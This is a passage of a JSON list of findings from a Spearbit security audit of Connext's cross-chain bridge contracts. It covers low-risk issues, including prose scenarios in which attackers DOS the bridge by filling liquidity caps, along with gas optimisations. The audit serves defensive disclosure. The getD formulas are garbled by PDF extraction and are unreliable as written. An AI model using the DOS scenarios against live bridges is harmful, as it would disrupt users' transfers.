        "body": "It seems that only the addLiquidity function is currently supporting the fee on transfer token. All operations like swapping are prohibiting the fee on transfer token. Note: The SwapUtilsExternal.sol contract allow fee on transfer token and as per product team, this is expected from this token",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Fee on transfer tokens can stuck the transaction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenario. 1. Assume User has made a xcall with amount A of token X with calldata C1. Since their was no fee while transferring funds, transfer was a success. 2. Now, before this amount can be transferred on the destination domain,token X introduced a fee on transfer. 3. Relayer now executes this transaction on destination domain via _handleExecuteTransaction function on BridgeFacet.sol#L756. 4. This transfers the amount A of token X to destination domain but since now the fee on this token has been introduced, destination domain receives amount A-delta. 5. This calldata is called on destination domain but the amount passed is A instead of A-delta so if the IXRe- ceiver has amount check then it will fail because it will now expect A amount when it really got A-delta amount.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Initial Liquidity Provider can trick the system",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Since there is no cap on the amount which initial depositor can deposit, an attacker can trick the system in bypassing admin fees for other users by selling liquidity at half admin fees. Consider the following scenario. 1. User A provides the first liquidity of a huge amount. 2. Since there aren't any fees from initial liquidity, admin fees are not collected from User A. 3. Now User A can sell his liquidity to other users with half admin fees. 4. Other users can mint larger liquidity due to lesser fees and User A also get benefit of adminFees/2.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ensure non-zero local asset in _xcall()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Local asset fetched in _xcall() is not verified to be a non-zero address. In case, if token mappings are not updated correctly and to future-proof from later changes, it's better to revert if a zero address local asset is fetched. local = _getLocalAsset(key, canonical.id, canonical.domain);",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use ExcessivelySafeCall to call xReceive()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "xReceive(). This is done to avoid copying large amount of return data in memory. This same attack vector exists for non-reconciled transfers, however in this case a usual function call is made for xReceive(). For However, in case non-reconciled calls fail due to this error, they can always be retried after reconciliation.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "A router's liquidity might get trapped if the router is removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If the owner or a user with Role.Router Role removes a router that does not implement calling re- moveRouterLiquidity or removeRouterLiquidityFor, then any liquidity remaining in the contract for the removed router cannot be transferred back to the router.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In-flight transfers by the relayer can be reverted when setMaxRoutersPerTransfer is called before- hand by a lower number",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For in-flight transfers where an approved sequencer has picked and signed an x number of routers for a transfer, from the time a relayer or another 3rd party grabs this ExecuteArgs _args to the time this party submits it to the destination domain by calling execute on a connext instance, the owner or an admin can call setMaxRoutersPerTransfer with a number lower than x on purpose or not. And this would cause the call to execute to revert with BridgeFacet__execute_maxRoutersExceeded.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "All the privileged users that can call withdrawSwapAdminFees would need to trust each other",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The owner needs to trust all the admins and also all admins need to trust each other. Since any admin can call withdrawSwapAdminFees endpoint to withdraw all the pool's admin fees into their account.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The supplied _a to initializeSwap cannot be directly updated but only ramped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the supplied _a (the scaled amplification coefficient, Ann(cid:0)1 ) to initializeSwap cannot be directly updated but only ramped. The owner or the admin can still call rampA to update _a, but it will take some time for it to reach the desired value. This is mostly important if by mistake an incorrect value for _a is provided to initializeSwap.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent behavior when xcall with a non-existent _params.to",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A xcall with a non-existent _params.to behaves differently depending on the path taken. 1. Fast Liquidity Path - Use IXReceiver(_params.to).xReceive. The _executeCalldata function will revert if _params.to is non-existent. Which technically means that the execution has failed. 2. Slow Path - Use ExcessivelySafeCall.excessivelySafeCall. This function uses the low-level call, which will not revert and will return true if the _params.to is non-existent. The _executeCalldata function will return with success set to True, which means the execution has succeeded.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The lpToken cloned in initializeSwap cannot be updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) an LPToken lpToken is created by cloning the provided lpTokenTargetAddress to the initializeSwap endpoint. There is no restriction on lpTokenTargetAddress except that it would need to be of LPToken like, but it can be malicious under the hood or have some security vulnerabilities, so it can not be trusted.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Lack of zero check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenarions.  Instance 1 - BridgeFacet.addSequencer The addSequencer function of BridgeFacet.sol does not check that the sequencer address is not zero before adding them. function addSequencer(address _sequencer) external onlyOwnerOrAdmin { if (s.approvedSequencers[_sequencer]) revert BridgeFacet__addSequencer_alreadyApproved(); s.approvedSequencers[_sequencer] = true; emit SequencerAdded(_sequencer, msg.sender); } If there is a mistake during initialization or upgrade, and set s.approvedSequencers[0] = true, anyone might be able to craft a payload to execute on the bridge because the attacker can bypass the following validation within the execute function. if (!s.approvedSequencers[_args.sequencer]) { revert BridgeFacet__execute_notSupportedSequencer(); }  Instance 2 - BridgeFacet.enrollRemoteRouter 43 The enrollRemoteRouter function of BridgeFacet.sol does not check that the domain or router address is not zero before adding them. function enrollRemoteRouter(uint32 _domain, bytes32 _router) external onlyOwnerOrAdmin { // Make sure we aren't setting the current domain as the connextion. if (_domain == s.domain) { revert BridgeFacet__addRemote_invalidDomain(); } s.remotes[_domain] = _router; emit RemoteAdded(_domain, TypeCasts.bytes32ToAddress(_router), msg.sender); }  Instance 3 - TokenFacet._enrollAdoptedAndLocalAssets The _enrollAdoptedAndLocalAssets function of TokenFacet.sol does not check that the _canonical.domain and _canonical.id are not zero before adding them. function _enrollAdoptedAndLocalAssets( address _adopted, address _local, address _stableSwapPool, TokenId calldata _canonical ) internal returns (bytes32 _key) { // Get the key _key = AssetLogic.calculateCanonicalHash(_canonical.id, _canonical.domain); // Get true adopted address adopted = _adopted == address(0) ? _local : _adopted; // Sanity check: needs approval if (s.approvedAssets[_key]) revert TokenFacet__addAssetId_alreadyAdded(); // Update approved assets mapping s.approvedAssets[_key] = true; // Update the adopted mapping using convention of local == adopted iff (_adooted == address(0)) s.adoptedToCanonical[adopted].domain = _canonical.domain; s.adoptedToCanonical[adopted].id = _canonical.id; These two values are used for generating the key to determine if a particular asset has been approved. Additionally, zero value is treated as a null check within the AssetLogic.getCanonicalTokenId function: // Check to see if candidate is an adopted asset. _canonical = s.adoptedToCanonical[_candidate]; if (_canonical.domain != 0) { // Candidate is an adopted asset, return canonical info. return _canonical; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When initializing Connext bridge make sure _xAppConnectionManager domain matches the one pro- vided to the initialization function for the bridgee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The only contract that implements IConnectorManager fully is SpokeConnector (through inheriting ConnectorManager and overriding localDomain): 45 // File: SpokeConnector.sol function localDomain() external view override returns (uint32) { return DOMAIN; } So a SpokeConnector or a IConnectorManager has its own concept of the local domain (the domain that it lives / is deployed on). And this domain is used when we are hashing messages and inserting them into the SpokeCon- nector's merkle tree: // File: SpokeConnector.sol bytes memory _message = Message.formatMessage( DOMAIN, bytes32(uint256(uint160(msg.sender))), _nonce, _destinationDomain, _recipientAddress, _messageBody ); // Insert the hashed message into the Merkle tree. bytes32 _messageHash = keccak256(_message); // Returns the root calculated after insertion of message, needed for events for // watchers (bytes32 _root, uint256 _count) = MERKLE.insert(_messageHash); We need to make sure that this local domain matches the _domain provided to this init function. Otherwise, the message hashes that are inserted into SpokeConnector's merkle tree would have 2 different origin domains linked to them. One from SpokeConnector in this message hash and one from connext's s.domain = _domain which is used in calculating the transfer id hash. The same issue applies to setXAppConnectionManager.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The stable swap pools used in Connext are incompatible with tokens with varying decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The stable swap functionality used in Connext calculates and stores for each token in a pool, the token's precision relative to the pool's precision. The token precision calculation uses the token's decimals. And since this precision is only set once, for a token that can have its decimals changed at a later time in the future, the precision used might not be always accurate in the future. And so in the event of a token decimal change, the swap calculations involving this token would be inaccurate. For exmpale in _xp(...): function _xp(uint256[] memory balances, uint256[] memory precisionMultipliers) internal pure returns (uint256[] memory) uint256 numTokens = balances.length; require(numTokens == precisionMultipliers.length, \"mismatch multipliers\"); uint256[] memory xp = new uint256[]numTokens; for (uint256 i; i < numTokens; ) { xp[i] = balances[i] * precisionMultipliers[i]; unchecked { ++i; } } return xp; { } We are multiplying in xp[i] = balances[i] * precisionMultipliers[i]; and cannot use division for tokens that have higher precision than the pool's default precision.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When Connext reaches the cap allowed custodied, race conditions can be created",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "When IERC20(local).balanceOf(address(this)) is close to s.caps[key] (this can be relative/subjective) for a canonical token on its canonical domain, a race condition gets created where users might try to frontrun each others calls to xcall or xcallIntoLocal to be included in a cross chain transfer. This race condition is actually between all users and all liquidity routers. Since there is a same type of check when routers try to add liquidity. uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Prevent sequencers from signing multiple routes for the same cross-chain transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Liquidity routers only sign the hash of (transferId, pathLength) combo. This means that each router does not have a say in: 1. The ordering of routers provided/signed by the sequencer. 2. What other routers are used in the sequence. If a sequencer signs 2 different routes (set of routers) for a cross-chain transfer, a relayer can decide which set of routers to use and provide to BridgeFacet.execute to make sure the liquidity from a specific set of routers' balances is used (also the same possibility if 2 different sequencers sign 2 different routes for a cross-chain transfer).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Well-funded malicious actors can DOS the bridge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A malicious actor (e.g. a well-funded cross-chain messaging competitor) can DOS the bridge cheaply. Assume Ethereum <-> Polygon bridge and the liquidity cap is set to 1m for USDC. 1. Using a slow transfer to avoid router liquidity fees, Bob (attacker) transferred 1m USDC from Ethereum to Polygon. 1m USDC will be locked on Connext's Bridge. Since the liquidity cap for USDC is filled, no one will be able to transfer any USDC from Ethereum to Polygon unless someone transfers POS-USDC from Polygon to Ethereum to reduce the amount of USDC held by the bridge. 2. On the destination chain, nextUSDC (local bridge asset) will be swapped to POS-USDC (adopted asset). The swap will incur low slippage because it is a stablewap. Assume that Bob will receive 999,900 POS-USDC back on Polygon. A few hundred or thousand loss is probably nothing for a determined competitor that wants to harm the reputation of Connext. 3. Bob bridged back the 999,900 POS-USDC using Polygon's Native POS bridge. Bob will receive 999,900 USDC in his wallet in Ethereum after 30 minutes. It is a 1-1 exchange using a native bridge, so no loss is incurred here. 4. Whenever the liquidity cap for USDC gets reduced on Connext's Bridge, Bob will repeat the same trick to keep the bridge in an locked state. 5. If Bob is well-funded enough, he could perform this against all Connext's bridges linked to other chains for popular assets (e.g. USDC), and normal users will have issues transferring popular assets when using xcall.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "calculateTokenAmount is not checking whether amounts provided has the same length as balances",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "There is no check to make sure amounts.length == balances.length in calculateTokenAmount: function calculateTokenAmount( Swap storage self, uint256[] calldata amounts, bool deposit ) internal view returns (uint256) { uint256 a = _getAPrecise(self); uint256[] memory balances = self.balances; ... There are 2 bad cases: 49 1. amounts.length > balances.length, in this case, we have provided extra data which will be ignored silently and might cause miscalculation on or off chain. 2. amounts.length < balances.length, the loop in calculateTokenAmount would/should revert becasue of an index-out-of-bound error. In this case, we might spend more gas than necessary compared to if we had performed the check and reverted early.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Rearrange an expression in _calculateSwapInv to avoid underflows",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the following expression used in SwapUtils_calculateSwapInv, if xp[tokenIndexFrom] = x + 1 the expression would underflow and revert. We can arrange the expression to avoid reverting in this edge case. dx = x - xp[tokenIndexFrom] + 1;",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The pre-image of DIAMOND_STORAGE_POSITION's storage slot is known",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The preimage of the hashed storage slot DIAMOND_STORAGE_POSITION is known.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The @param NatSpec comment for _key in AssetLogic._swapAsset is incorrect",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The @param NatSpec for _key indicates that this parameter is a canonical token id where instead it should mention that it is a hash of a canonical id and its corresponding domain. We need to make sure the correct value has been passed down to _swapAsset.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Malicious routers can temporarily DOS the bridge by depositing a large amount of liquidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Both router and bridge share the same liquidity cap on the Connext bridge. Assume that the liquidity cap for USDC is 1 million on Ethereum. Shortly after the Connext Amarok launch, a router adds 1 million USDC liquidity. No one would be able to perform a xcall transfer with USDC from Ethereum to other chains as it will always revert because the liquidity cap has exceeded. The DOS is temporary because the router's liquidity on Ethereum will be reduced if there is USDC liquidity flowing in the opposite direction (e.g., From Polygon to Ethereum)",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Prevent deploying a representation token twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function setupAsset() is protected by _enrollAdoptedAndLocalAssets() which checks s.approvedAssets[_key] to prevent accidentally setting up an asset twice. However the function _removeAssetId() is rather thorough and removes the s.approvedAssets[_key] flag. After a call to _removeAssetId(), an asset can be recreated via setupAsset(). This will deploy a second representation token which will be confusing to users of Connext. Note: The function setupAssetWithDeployedRepresentation() could be used to connect a previous presentation token again to the canonical token. Note: All these functions are authorized so it would only be a problem if mistakes are made. 51 function setupAsset(...) ... onlyOwnerOrAdmin ... { if (_canonical.domain != s.domain) { _local = _deployRepresentation(...); // deploys a new token } else { ... } bytes32 key = _enrollAdoptedAndLocalAssets(_adoptedAssetId, _local, _stableSwapPool, _canonical); ... } function _enrollAdoptedAndLocalAssets(...) ... { ... if (s.approvedAssets[_key]) revert TokenFacet__addAssetId_alreadyAdded(); s.approvedAssets[_key] = true; ... } function _removeAssetId(...) ... { ... delete s.approvedAssets[_key]; ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Extra safety checks in _removeAssetId()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _removeAssetId() deletes assets but it doesn't check if the passed parameters are a consistent set. This allows for mistakes where the wrong values are accidentally deleted. function _removeAssetId(bytes32 _key, address _adoptedAssetId, address _representation) internal { ... delete s.adoptedToCanonical[_adoptedAssetId]; delete s.representationToCanonical[_representation]; ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Data length not validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The following functions do not validate that the input _data is 32 bytes.  GnosisSpokeConnector._sendMessag  GnosisSpokeConnector._processMessage  BaseMultichain.sendMessage  OptimismSpokeConnector._sendMessage The input _data contains the outbound Merkle root or aggregated Merkle root, which is always 32 bytes. If the root is not 32 bytes, it is invalid and should be rejected.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Verify timestamp reliability on L2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Timestamp information on rollups can be less reliable than on mainnet. For instance, Arbitrum docs say: As a general rule, any timing assumptions a contract makes about block numbers and timestamps should be considered generally reliable in the longer term (i.e., on the order of at least several hours) but unreliable in the shorter term (minutes). (It so happens these are generally the same assumptions one should operate under when using block numbers directly on Ethereum!) Uniswap docs mention this for Optimism: The block.timestamp of these blocks, however, reflect the block.timestamp of the last L1 block ingested by the Sequencer.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "MirrorConnector cannot be changed once set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For chains other than Polygon, it is allowed to change mirror connector any number of times. For Polygon chain, the _setMirrorConnector is overridden. 1. Let's take PolygonHubConnector contract example: function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxChildTunnel(_mirrorConnector); } 2. Since setFxChildTunnel(PolygonHubConnector) can only be called once due to below require check, this also restricts the number of time mirror connector can be altered. function setFxChildTunnel(address _fxChildTunnel) public virtual { require(fxChildTunnel == address(0x0), \"FxBaseRootTunnel: CHILD_TUNNEL_ALREADY_SET\"); ... } 54",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Possible infinite loop in dequeueVerified()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The loop in function dequeueVerified() doesn't end if queue.first == queue.last == 0. In this situation, at unchecked { --last; } the following happens: last wraps to type(uint128).max. Now last is very large and is surely >=first and thus the loop keeps running. This problem can occur when queue isn't initialized. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { uint128 first = queue.first; uint128 last = queue.last; require(last >= first, \"queue empty\"); for (last; last >= first; ) { ... unchecked { --last; } // underflows when last == 0 (e.g. queue isn't initialized) } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Do not ignore staticcall's return value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TypedMemView calls several precompiles through staticcall opcode and never checks its return value assuming it is a success. For instance: TypedMemView.sol#L668-L669, TypedMemView.sol#L685-L686, // use the identity precompile to copy // guaranteed not to fail, so pop the success pop(staticcall(gas(), 4, _oldLoc, _len, _newLoc, _len)) However, there are rare cases when call to precompiles can fail. For example, when the call runs out of gas (since 63/64 of the gas is passed, the remaining execution can still have gas). Generally, not checking for success of calls is dangerous and can have unintended consequences.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk TypedMemView.sol#L652,"
        ]
    },
    {
        "title": "Renounce wait time can be extended",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The _proposedOwnershipTimestamp updates everytime on calling proposeNewOwner with newlyPro- posed as zero address. This elongates the time when owner can be renounced.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Extra parameter in function checker() at encodeWithSelector()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function checker() sets up the parameters to call the function sendMessage(). However, it adds an extra parameter outboundRoot, which isn't necessary. function sendMessage() external { ... } function checker() external view override returns (bool canExec, bytes memory execPayload) { ... execPayload = abi.encodeWithSelector(this.sendMessage.selector, outboundRoot); // extra parameter ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "MerkleLib.insert() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "storage. Each call to MerkleLib.insert() reads the entire tree from storage, and writes 2 (tree.count and tree.branch[i]) back to storage. These storage operations can be done only once at the beginning, by loading them in memory. The updated count and branches can be written back to the storage at the end saving expensive SSTORE and SLOAD operations.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "EIP712 domain separator can be cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The domain separator can be cached for gas-optimization.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "stateCommitmentChain can be made immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once assigned in constructor, stateCommitmentChain cannot be changed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Nonce can be updated in single step",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Nonce can be incremented in single step instead of using a second step which will save some gas",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ZkSyncSpokeConnector._sendMessage encodes unnecessary data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Augmenting the _data with the processMessage function selector is unnecessary. Since on the mirror domain, we just need to provide the right parameters to ZkSyncHubConnector.processMessageFromRoot (which by the way anyone can call) to prove the L2 message inclusion of the merkle root _data. Thus the current implementation is wasting gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "getD can be optimized by removing an extra multiplication by d per iteration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The calculation for the new d can be simplified by canceling a d from the numerator and denominator. Basically, we have : f (D) = 1 nn+1a Q xi Dn+1 + (1 (cid:0) 1 na )D (cid:0) X xi 59 and having/assuming n, a, xi are fixed, we are using Newton's method to find a solution for f = 0. The original implementation is using: D0 = D (cid:0) f (D) f 0(D) = which can be simplified to: (na P xi + Dn+1 nn(cid:0)1 Q xi )D (na (cid:0) 1)D + (n + 1) Dn+1 nn Q xi na P xi + D0 = Dn nn(cid:0)1 (na (cid:0) 1) + (n + 1) D Q xi Dn Q xi nn",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_recordOutputAsSpent in ArbitrumHubConnector can be optimized by changing the require condition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In _recordOutputAsSpent, _index is compared with a literal value that is a power of 2. The expo- nentiation in this statement can be completely removed to save gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Message.leaf's memory manipulation is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The chunk of memory related to _message is dissected into pieces and then copied into another section of memory and hashed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "coerceBytes32 can be more optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "It would be cheaper to not use TypedMemView in coerceBytes32(). We would only need to check the length and mask. Note: coerceBytes32 doesn't seem to be used. If that is the case it could also be removed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider removing domains from propagate() arguments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "propagate(uint32[] calldata _domains, address[] calldata _connectors) only uses _do- mains to verify its hash against domainsHash, and to emit an event. Hence, its only use seems to be to notify off-chain agents of the supported domains.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Loop counter can be made uint256 to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "There are several loops that use an uint8 as the type for the loop variable. Changing that to uint256 can save some gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Set owner directly to zero address in renounceOwnership",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "1. In renounceOwnership function, _proposed will always be address zero so instead of setting the variable _proposed as owner, we can directly set address(0) as the new owner. 2. Similarly for renounceOwnership function also set address(0) as the new owner.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Retrieve decimals() once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "There are several locations where the number of decimals() of tokens are retrieved. As all tokens are whitelisted, it would also be possible to retrieve the decimals() once and store these to save gas. BridgeFacet.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function _xcall(...) ... { ... ... AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); ... } AssetLogic.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function swapToLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(ERC20(_asset).decimals(), ERC20(_local).decimals(), _amount, _slippage) ... ... ,! } function swapFromLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(uint8(18), ERC20(adopted).decimals(), _normalizedIn, _slippage) ... ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The root... function in Merkle.sol can be optimized by using YUL, unrolling loops and using the scratch space",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "We can use assembly, unroll loops, and use the scratch space to save gas. Also, rootWithCtx can be removed (would save us from jumping) since it has only been used here.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The insert function in Merkle.sol can be optimized by using YUL, unrolling loops and using the scratch space",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If we use assembly. the scratch space for hashing and unrolling the loop, we can save some gas.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
